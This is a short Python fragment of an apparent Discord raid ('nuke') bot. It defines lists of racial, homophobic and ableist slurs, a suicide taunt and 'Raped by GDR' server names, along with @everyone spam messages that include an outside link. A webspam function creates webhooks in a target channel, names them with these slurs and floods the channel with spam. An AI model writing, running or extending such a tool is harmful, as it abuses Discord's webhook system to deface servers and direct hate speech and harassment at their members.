import discord, random
from discord.ext import commands
funny = ["get fucked", "kys fags", "UNGA BUNGA", "Nuked by GDR (based)", "I HATE BLACKIES NIGGERS"]
words = ["@everyone GET FUCKED", "@everyone WAKE UP RETARDS", "@everyone AHAHAHAH", "@everyone NUKED BY GDR", "@everyone https://liesandreality.000webhostapp.com", "@everyone https://media.discordapp.net/attachments/863392124095299596/863393036885033020/s1100_01-groot-.png?width=766&height=595"]
servername = ["GDR district Colonial", "GDR colony", "Raped by GDR"]
async def webspam(channel, spam):
    wn = random.choice(funny)
    wm = random.choice(words)
    webhook = await channel.create_webhook(name=wn)
    await webhook.send(spam)
    print("Made Webhook")